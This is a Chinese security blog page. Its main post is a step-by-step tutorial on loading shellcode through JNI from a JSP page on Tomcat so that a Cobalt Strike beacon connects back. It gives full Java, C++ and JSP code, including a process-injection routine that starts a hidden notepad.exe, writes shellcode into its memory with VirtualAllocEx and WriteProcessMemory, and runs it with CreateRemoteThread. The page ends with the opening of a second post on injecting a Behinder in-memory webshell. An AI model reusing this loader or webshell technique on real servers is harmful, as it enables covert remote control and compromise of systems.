<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="comment">//声明一个native方法，该方法在C中实现</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">testHello</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">//加载C文件</span></span><br><span class="line">        System.loadLibrary(<span class="string">"TestJNI"</span>);</span><br><span class="line">        Hello jniDemo = <span class="keyword">new</span> Hello();</span><br><span class="line">        jniDemo.testHello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>生成C文件头</strong></p>
<p><code>javah -classpath . -jni Hello</code></p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105165305767.png" alt="image-20210105165305767"></p>
<p><strong>创建DLL项目</strong></p>
<p>​        使用visual studio创建DLL项目，并创建一个test666.cpp文件。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105170652974.png" alt="image-20210105170652974"></p>
<p><strong>导入头文件</strong></p>
<p>​        在JDK下的include目录下找到jni.h，include/win32下找到jni_md.h还有之前编译好的Hello.h文件拷贝到项目目录下。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105171507598.png" alt="image-20210105171507598"></p>
<p>​        再将这三个头文件导入到项目中</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105171711628.png" alt="image-20210105171711628"></p>
<p>​        在jni.h中，主要包含一些类型的定义和函数的声明，如下所示：</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105173642399.png" alt="image-20210105173642399"></p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105173708526.png" alt="image-20210105173708526"></p>
<p>​        在jin_md.h中，主要是对一些关键字声明</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105173938940.png" alt="image-20210105173938940"></p>
<p>​        在Hello.h提示找不到jni.h，这里需要将&lt;&gt;改为“”</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105174702474.png" alt="image-20210105174702474"></p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105174824808.png" alt="image-20210105174824808"></p>
<p><strong>编写testHello函数</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"test666.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Hello.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL <span class="title">Java_Hello_testHello</span><span class="params">(JNIEnv*, jobject)</span> </span>&#123; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this is C++ print"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        JNIEXPORT的定义为<code>#define JNIEXPORT __declspec(dllexport)</code>,<code>__declspec(dllexport)</code>用于Windows中的动态库中，声明导出函数、类、对象等供外面调用，也就是将这个函数声明为导出函数，供其他函数调用。 JNICALL的定义为__stdcall，代表系统调用。JNIEnv_是一个封装了几乎全部 JNI 方法的一个结构体。使用的函数名为Hello.h中定义的函数名。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106094104524.png" alt="image-20210106094104524"></p>
<p>​        使用x64编译好后，会生成一个DLL文件</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106095459727.png" alt="image-20210106095459727"></p>
<p>​        在IDEA中 VM options选项中设置路径DLL文件绝对路径<code>-Djava.library.path=C:\xxx\xxx\source\repos\JNI_Dll\x64\Release</code>    </p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106100237210.png" alt="image-20210106100237210"></p>
<p>​        即可正常运行JNI函数。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106100447172.png" alt="image-20210106100447172"></p>
<p>​        也可以使用<code>System.load(&quot;C:\\xxxx\\xxxx\\source\\repos\\JNI_Dll\\x64\\Release\\JNI_Dll.dll&quot;);</code>的方式加载DLL并执行其中的导出函数。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106100923974.png" alt="image-20210106100923974"></p>
<h3 id="如何调试JNI"><a href="#如何调试JNI" class="headerlink" title="如何调试JNI?"></a>如何调试JNI?</h3><p>​        在使用JNI时，由于DLL无法独立运行，遇到错误不方便调试，所以需要了解下如何调试JNI。</p>
<p>​        首先以Debug模式运行JAVA项目，并在调用JNI函数时打上断点。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106102327645.png" alt="image-20210106102327645"></p>
<p>​        使用JAVA自带的工具jps找到运行当前类所对应的进程ID</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106102413186.png" alt="image-20210106102413186"></p>
<p>​        在vs中在需要调试的函数处打断点，选择<code>调试-》附加到进程-》找到需要调试的类的进程</code></p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106102543581.png" alt="image-20210106102543581"></p>
<p>​        附加到进程后，在JAVA中执行步过，即可运行到JNI函数处。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106102714754.png" alt="image-20210106102714754"></p>
<h3 id="如何利用JNI加载shellcode"><a href="#如何利用JNI加载shellcode" class="headerlink" title="如何利用JNI加载shellcode?"></a>如何利用JNI加载shellcode?</h3><p>​        首先编写java文件，调用native层的函数inject，并传入shellcode。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">inject</span><span class="params">(<span class="keyword">byte</span>[] me)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; (<span class="keyword">byte</span>)<span class="number">0xfc</span>, (<span class="keyword">byte</span>)<span class="number">0x48</span>, (<span class="keyword">byte</span>)<span class="number">0x83</span>, (<span class="keyword">byte</span>)<span class="number">0xe4</span>, (<span class="keyword">byte</span>)<span class="number">0xf0</span>, (<span class="keyword">byte</span>)<span class="number">0xe8</span>, (<span class="keyword">byte</span>)<span class="number">0xc8</span>, (<span class="keyword">byte</span>)<span class="number">0x00</span>, (<span class="keyword">byte</span>)<span class="number">0x00</span>, (<span class="keyword">byte</span>)<span class="number">0x00</span>, (<span class="keyword">byte</span>)<span class="number">0x41</span>, (<span class="keyword">byte</span>)<span class="number">0x51</span>, (<span class="keyword">byte</span>)<span class="number">0x41</span>, (<span class="keyword">byte</span>)<span class="number">0x50</span>, &#125;; <span class="comment">//生成的java类型的shellcode</span></span><br><span class="line">        System.load(<span class="string">"C:\\xxx\\xx\\xxx\\JNI_Dll.dll"</span>);</span><br><span class="line">        Hello jniDemo = <span class="keyword">new</span> Hello();</span><br><span class="line">        jniDemo.inject(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        编写C++文件,分配内存并将shellcode加载到内存。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"test666.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Hello.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inject</span><span class="params">(LPCVOID <span class="built_in">buffer</span>, <span class="keyword">int</span> length)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL <span class="title">Java_Hello_inject</span><span class="params">(JNIEnv * env, jobject object, jbyteArray jdata)</span></span>&#123;</span><br><span class="line">	jbyte* data = env-&gt;GetByteArrayElements(jdata, <span class="number">0</span>);</span><br><span class="line">	jsize length = env-&gt;GetArrayLength(jdata);</span><br><span class="line">	inject((LPCVOID)data,(SIZE_T)length);</span><br><span class="line">	env-&gt;ReleaseByteArrayElements(jdata, data, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inject</span><span class="params">(LPCVOID <span class="built_in">buffer</span>, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    SIZE_T wrote;</span><br><span class="line">    LPVOID ptr;</span><br><span class="line">    <span class="keyword">char</span> lbuffer[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">char</span> cmdbuff[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* reset some stuff */</span></span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">    ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* start a process */</span></span><br><span class="line">    GetStartupInfo(&amp;si);</span><br><span class="line">    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = SW_HIDE;</span><br><span class="line">    si.hStdOutput = <span class="literal">NULL</span>;</span><br><span class="line">    si.hStdError = <span class="literal">NULL</span>;</span><br><span class="line">    si.hStdInput = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolve windir? */</span></span><br><span class="line">    GetEnvironmentVariableA(<span class="string">"windir"</span>, lbuffer, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* setup our path... choose wisely for 32bit and 64bit platforms */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IS64_</span></span><br><span class="line">    _snprintf(cmdbuff, <span class="number">1024</span>, <span class="string">"%s\\SysWOW64\\notepad.exe"</span>, lbuffer);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    _snprintf(cmdbuff, <span class="number">1024</span>, <span class="string">"%s\\System32\\notepad.exe"</span>, lbuffer);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spawn the process, baby! */</span></span><br><span class="line">    <span class="keyword">if</span>(!CreateProcessA(<span class="literal">NULL</span>, cmdbuff, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    hProcess = pi.hProcess;</span><br><span class="line">    <span class="keyword">if</span> (!hProcess)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* allocate memory in our process */</span></span><br><span class="line">    ptr = (LPVOID)VirtualAllocEx(hProcess, <span class="number">0</span>, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write our shellcode to the process */</span></span><br><span class="line">    WriteProcessMemory(hProcess, (LPTHREAD_START_ROUTINE)ptr, <span class="built_in">buffer</span>, (SIZE_T)length, (SIZE_T*)&amp;wrote);</span><br><span class="line">    <span class="keyword">if</span> (wrote != length)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create a thread in the process */</span></span><br><span class="line">    CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>,(LPTHREAD_START_ROUTINE)ptr, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        执行java文件，加载shellcode上线</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106141335054.png" alt="image-20210106141335054"></p>
<p>​        但当我把这个java代码改为jsp脚本在tomcat上执行却会报错,即使将JNI函数中的内容清空仍然会报这个错。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106160224472.png" alt="image-20210106160224472"></p>
<p>​        但是这个代码在JAVA中运行却没有问题，为什么在写JSP在tomcat下运行就会有问题，之前我们了解过JNI函数的调用和函数名有关系，JNI函数的函数名必须为<code>JAVA_包名_类名_函数名</code>这种形式，而JSP脚本本身是无法运行的，在tomcat中会将jsp脚本转化为java再编译为class文件运行。而生成的这个JAVA文件是以org.apache.jsp为包名，文件名_jsp为类名运行的。经过这层转变JNI函数中的函数名已经不符合要求了，自然无法成功调用。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106160759454.png" alt="image-20210106160759454"></p>
<p>​        所以我们声明的类文件必须再<code>org.apache.jsp</code>包下，并且外部类的类名应该为文件名_jsp，我们需要调用的JNI函数应该定义再内部类中,我这里假如我想使用test.jsp文件加载shellcode上线。首先写一个java文件内容如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.jsp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test_jsp</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">JniClass</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">inject</span><span class="params">(<span class="keyword">byte</span>[] me)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        使用javac编译该文件，会生成两个class类文件。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106161604711.png" alt="image-20210106161604711"></p>
<p>​        因为要调用的JNI函数是写在内部类中，所以需要以内部类生成一个头文件,将目录切换到src目录下，执行<code>javah org.apache.jsp.test_jsp$JniClass</code>生成需要的头文件。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106161810624.png" alt="image-20210106161810624"></p>
<p>​        将生成的<code>org.apache.jsp.test_jsp$JniClass.h</code>放到C++的项目目录下,再添加到头文件中</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106162256764.png" alt="image-20210106162256764"></p>
<p>​        最后编写test.cpp文件，内容如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"jni.h"</span></span></span><br><span class="line"><span class="comment">/* Header for class org_apache_jsp_test_jsp_JniClass */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _Included_org_apache_jsp_test_jsp_JniClass</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _Included_org_apache_jsp_test_jsp_JniClass</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     org_apache_jsp_test_jsp_JniClass</span></span><br><span class="line"><span class="comment"> * Method:    inject</span></span><br><span class="line"><span class="comment"> * Signature: ([B)V</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JNIEXPORT <span class="keyword">void</span> JNICALL Java_org_apache_jsp_test_1jsp_00024JniClass_inject</span><br><span class="line">  (JNIEnv *, jobject, jbyteArray);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>​        编写test.jsp，内容如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JniClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">inject</span><span class="params">(<span class="keyword">byte</span>[] me)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; (<span class="keyword">byte</span>)<span class="number">0xfc</span>, (<span class="keyword">byte</span>)<span class="number">0x48</span>, (<span class="keyword">byte</span>)<span class="number">0x83</span>, (<span class="keyword">byte</span>)<span class="number">0xe4</span>, (<span class="keyword">byte</span>)<span class="number">0xf0</span>, (<span class="keyword">byte</span>)<span class="number">0xe8</span>, (<span class="keyword">byte</span>)<span class="number">0xc8</span>, (<span class="keyword">byte</span>)<span class="number">0x00</span>, (<span class="keyword">byte</span>)<span class="number">0x00</span>, (<span class="keyword">byte</span>)<span class="number">0x00</span>, (<span class="keyword">byte</span>)<span class="number">0x41</span>, (<span class="keyword">byte</span>)<span class="number">0x51</span>, (<span class="keyword">byte</span>)<span class="number">0x41</span>, (<span class="keyword">byte</span>)<span class="number">0x50</span>, (<span class="keyword">byte</span>)<span class="number">0x52</span>, (<span class="keyword">byte</span>)<span class="number">0x51</span>, (<span class="keyword">byte</span>)<span class="number">0x56</span>, (<span class="keyword">byte</span>)<span class="number">0x48</span>, (<span class="keyword">byte</span>)<span class="number">0x31</span>,xxx &#125;;<span class="comment">// JAVA SHELLCODE </span></span><br><span class="line"></span><br><span class="line">System.load(<span class="string">"C:\\XXX\\XXX\\XXX\\JNI_Dll.dll"</span>);</span><br><span class="line">JniClass jniDemo = <span class="keyword">new</span> JniClass();</span><br><span class="line">jniDemo.inject(buf);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>​            访问jsp即可上线。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106174003896.png" alt="image-20210106174003896"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" class="post-title-link" itemprop="url">注入冰蝎内存马实现</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-04 16:39:53" itemprop="dateCreated datePublished" datetime="2021-01-04T16:39:53+08:00">2021-01-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-01-05 13:37:48" itemprop="dateModified" datetime="2021-01-05T13:37:48+08:00">2021-01-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        通过之前的文章，我们了解了servlet和filter类型的内存马的实现，但是实现的是cmd马，在实战的过程中会有两个问题。1.不方便操作使用.2.比较难过WAF的查杀。本片文章我先解决一下第一个问题，将冰蝎马注入到内存。</p>
<h2 id="冰蝎马实现"><a href="#冰蝎马实现" class="headerlink" title="冰蝎马实现"></a>冰蝎马实现</h2><h3 id="客户端实现"><a href="#客户端实现" class="headerlink" title="客户端实现"></a>客户端实现</h3><p>​         由于静态分析比较麻烦，所以我选择直接debug调试，这里感谢<code>https://github.com/Freakboy/Behinder</code>给出了可以直接运行的冰蝎3.0源码，有了源码可以方便调试并且根据需求对冰蝎进行二次开发。</p>
<h4 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h4><pre><code>我选择了文件上传的操作来分析冰蝎的执行过程，上传操作由vip.youwe.sheller.ui.controller.FileManagerViewController#uploadFile实现，首先获取的需要上传的文件名，再通过`Utils.getFileData(selectdFile.getAbsolutePath())`获取需要上传的内容，最后通过` this.currentShellService.uploadFile(currentPath + fileName, fileContent);`执行真正的上传逻辑。 </code></pre><p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104200400375.png" alt="image-20210104200400375"></p>
<p>​        创建LinkedHashMap，将mode、path、content的内容分别赋值为create、远程文件地址、文件内容,调用<code>Utils.getData(this.currentKey, this.encryptType, &quot;FileOperation&quot;, params, this.currentType);</code></p>
